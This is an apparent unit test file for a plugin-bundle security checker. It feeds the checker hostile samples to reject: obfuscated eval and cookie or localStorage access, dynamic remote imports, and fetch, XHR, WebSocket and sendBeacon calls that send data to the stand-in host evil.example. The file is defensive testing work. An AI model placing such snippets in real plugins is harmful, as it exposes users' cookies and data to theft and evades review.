/**
 * @license
 * Copyright 2026 Aglyn LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import {
  type BundleCheckProblem,
  checkPluginBundle,
  isStoredVerdictCurrent,
  PLUGIN_VERIFIER_VERSION,
} from './plugin-bundle-checks'

const GOOD_BUNDLE = `const host = globalThis.__AGLYN_PLUGIN_HOST__;
var React = host["React"];
function Widget() { return React.createElement('div', null, 'hi'); }
export function register(h) { h.aglyn.registerConsoleExtension({ pluginId: 'x' }); }
`

describe('checkPluginBundle (AGL-426)', () => {
  it('accepts a self-contained bundle exporting register', () => {
    const result = checkPluginBundle(GOOD_BUNDLE)
    expect(result.ok).toBe(true)
    expect(result.exports.register).toBe(true)
    expect(result.exports.registerApi).toBe(false)
  })

  it('accepts export-brace and registerApi shapes', () => {
    const result = checkPluginBundle(
      'async function registerApi() {}\nexport { registerApi };\n',
    )
    expect(result.ok).toBe(true)
    expect(result.exports.registerApi).toBe(true)
  })

  it('rejects a bundle with no entry export', () => {
    const result = checkPluginBundle('console.log("nothing here")\n')
    expect(result.ok).toBe(false)
    expect(result.problems.some((p) => p.message.includes('register'))).toBe(
      true,
    )
  })

  it('rejects leftover static imports', () => {
    const result = checkPluginBundle(
      `import React from 'react'\nexport function register() {}\n`,
    )
    expect(result.ok).toBe(false)
    expect(
      result.problems.some((p) => p.message.includes('static imports')),
    ).toBe(true)
  })

  it('rejects forbidden APIs', () => {
    for (const evil of [
      'eval("x")',
      'new Function("x")',
      'document.cookie',
      'localStorage.getItem("k")',
      'import("https://evil.example/x.mjs")',
    ]) {
      const result = checkPluginBundle(
        `export function register() { ${evil} }\n`,
      )
      expect(result.ok).toBe(false)
    }
  })

  // The regex checker passed every one of these (AGL-964). They are the
  // reason the checker parses now: none of them is exotic, and a bundle is
  // minified by the time it is published, so text matching saw nothing.
  it('sees through the shapes that hid from the text scan (AGL-964)', () => {
    for (const evil of [
      `const g = globalThis; g['ev' + 'al']('fetch(1)')`,
      `(() => {}).constructor('return 1')()`,
      `const d = document; d['coo' + 'kie']`,
      `globalThis['local' + 'Storage'].getItem('k')`,
      `const u = location.hash; import(u)`,
      `const w = window; w[key]`,
      'globalThis.eval("x")',
    ]) {
      const result = checkPluginBundle(
        `export function register() { ${evil} }\n`,
      )
      expect([evil, result.ok]).toEqual([evil, false])
    }
  })

  it('does not read a comment or a string as code (AGL-964)', () => {
    // The one thing the regex checker DID flag was its own documentation.
    const result = checkPluginBundle(
      `// this plugin does not use eval( anywhere\n` +
        `const help = 'document.cookie is never touched'\n` +
        `export function register() { console.log(help) }\n`,
    )
    expect(result.ok).toBe(true)
    expect(result.problems).toEqual([])
  })

  it('leaves ordinary property names on ordinary objects alone', () => {
    const result = checkPluginBundle(
      `export function register(host) {\n` +
        `  const response = host.get()\n` +
        `  return [response.cookie, response.localStorage, host.state[key]]\n` +
        `}\n`,
    )
    expect(result.ok).toBe(true)
    expect(result.problems).toEqual([])
  })

  it('rejects a bundle it cannot parse', () => {
    const result = checkPluginBundle('export function register() { <<< }\n')
    expect(result.ok).toBe(false)
    expect(result.problems.some((p) => p.message.includes('does not parse'))).toBe(
      true,
    )
  })

  describe('network calls vs declared capabilities (AGL-964)', () => {
    const bundle = (body: string) =>
      `export function register() { ${body} }\n`

    it('rejects a network call when the manifest declares no network', () => {
      const result = checkPluginBundle(
        bundle(`fetch('https://evil.example', { body: document.title })`),
        { declaredNetwork: [] },
      )
      expect(result.ok).toBe(false)
      expect(
        result.problems.some((p) => p.message.includes('no network capability')),
      ).toBe(true)
    })

    it('rejects an origin the manifest does not declare', () => {
      const result = checkPluginBundle(
        bundle(`fetch('https://evil.example/collect')`),
        { declaredNetwork: ['https://api.example.com'] },
      )
      expect(result.ok).toBe(false)
      expect(
        result.problems.some((p) => p.message.includes('https://evil.example')),
      ).toBe(true)
    })

    it('accepts a declared origin', () => {
      const result = checkPluginBundle(
        bundle(`fetch('https://api.example.com/v1/x')`),
        { declaredNetwork: ['https://api.example.com'] },
      )
      expect(result.ok).toBe(true)
    })

    it('warns rather than fails on a URL only known at runtime', () => {
      const result = checkPluginBundle(bundle(`fetch(url)`), {
        declaredNetwork: ['https://api.example.com'],
      })
      expect(result.ok).toBe(true)
      expect(result.problems[0].level).toBe('warning')
    })

    it('catches XHR, WebSocket and sendBeacon too', () => {
      for (const evil of [
        `new XMLHttpRequest().open('POST', 'https://evil.example')`,
        `new WebSocket('wss://evil.example')`,
        `navigator.sendBeacon('https://evil.example', 'x')`,
      ]) {
        const result = checkPluginBundle(bundle(evil), { declaredNetwork: [] })
        expect([evil, result.ok]).toEqual([evil, false])
      }
    })

    it('only warns when nobody told it what was declared', () => {
      // A checker that was never given the manifest cannot claim a call is
      // undeclared — the review page re-runs verdicts for old versions.
      const result = checkPluginBundle(bundle(`fetch('https://evil.example')`))
      expect(result.ok).toBe(true)
      expect(result.problems[0].level).toBe('warning')
    })
  })

  describe('obfuscation heuristics (AGL-964)', () => {
    it('warns about machine-obfuscated identifiers without failing', () => {
      const names = Array.from(
        { length: 6 },
        (_, index) => `const _0xdead0${index} = ${index}`,
      ).join('\n')
      const result = checkPluginBundle(
        `${names}\nexport function register() { return _0xdead00 }\n`,
      )
      expect(result.ok).toBe(true)
      expect(
        result.problems.some((p) => p.message.includes('machine-obfuscated')),
      ).toBe(true)
    })

    it('warns about a large embedded base64 literal', () => {
      const result = checkPluginBundle(
        `const blob = '${'QUJDREVG'.repeat(200)}'\n` +
          `export function register() { return blob }\n`,
      )
      expect(result.ok).toBe(true)
      expect(result.problems.some((p) => p.message.includes('base64'))).toBe(true)
    })

    it('warns about an unreadable single line', () => {
      const result = checkPluginBundle(
        `export function register() { const x = '${'a'.repeat(120_000)}'; return x }\n`,
      )
      expect(result.ok).toBe(true)
      expect(
        result.problems.some((p) => p.message.includes('character line')),
      ).toBe(true)
    })
  })

  it('rejects empty and oversized bundles', () => {
    expect(checkPluginBundle('').ok).toBe(false)
    const result = checkPluginBundle(
      `export function register() {}\n${'x'.repeat(64)}`,
      { maxBytes: 32 },
    )
    expect(result.ok).toBe(false)
  })
})

describe('isStoredVerdictCurrent (AGL-962)', () => {
  const SHA = 'a'.repeat(64)
  const OTHER = 'b'.repeat(64)
  const verdict = (overrides: Record<string, unknown> = {}) => ({
    ok: true,
    problems: [] as BundleCheckProblem[],
    sha256: SHA,
    verifierVersion: PLUGIN_VERIFIER_VERSION,
    ...overrides,
  })

  it('serves a verdict for the same bytes from the same checker', () => {
    expect(isStoredVerdictCurrent(verdict(), SHA)).toBe(true)
  })

  it('rejects a verdict for different bytes', () => {
    // A republish keeps the version string but changes the sha; the old
    // verdict was never true of these bytes.
    expect(isStoredVerdictCurrent(verdict({ sha256: OTHER }), SHA)).toBe(false)
  })

  it('rejects a verdict from an older checker', () => {
    expect(
      isStoredVerdictCurrent(
        verdict({ verifierVersion: PLUGIN_VERIFIER_VERSION - 1 }),
        SHA,
      ),
    ).toBe(false)
  })

  it('rejects a verdict with no checker version — pre-AGL-962 writes', () => {
    expect(isStoredVerdictCurrent(verdict({ verifierVersion: undefined }), SHA)).toBe(
      false,
    )
  })

  it('rejects a missing verdict or an unknown sha', () => {
    expect(isStoredVerdictCurrent(null, SHA)).toBe(false)
    expect(isStoredVerdictCurrent(undefined, SHA)).toBe(false)
    expect(isStoredVerdictCurrent(verdict(), '')).toBe(false)
  })
})
